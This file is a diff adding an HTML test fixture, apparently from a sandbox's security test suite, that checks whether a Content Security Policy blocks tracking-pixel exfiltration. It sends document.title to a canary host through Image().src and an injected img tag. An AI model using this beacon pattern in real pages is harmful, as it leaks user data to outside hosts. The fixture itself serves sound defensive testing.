@@ -1,0 +1,22 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: image beacon</title>
+<!-- ATTACK: classic tracking-pixel exfil via Image().src and <img src>.
+     Blocked by CSP img-src (thing:/data:/blob: only). Canary must stay silent. -->
+<script>
+  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const r = { attack: 'image-beacon' };
+  let done = false;
+  const finish = () => { if (!done) { done = true; window.bridge.emit('done', r); } };
+
+  const img = new Image();
+  img.onload = () => { r.loaded = true; finish(); };
+  img.onerror = () => { r.error = 'onerror'; finish(); };
+  img.src = canary.http + '/pixel.gif?steal=' + encodeURIComponent(document.title);
+
+  const el = document.createElement('img');
+  el.src = canary.http + '/pixel2.gif';
+  document.body && document.body.appendChild(el);
+
+  setTimeout(finish, 1500);
+</script>
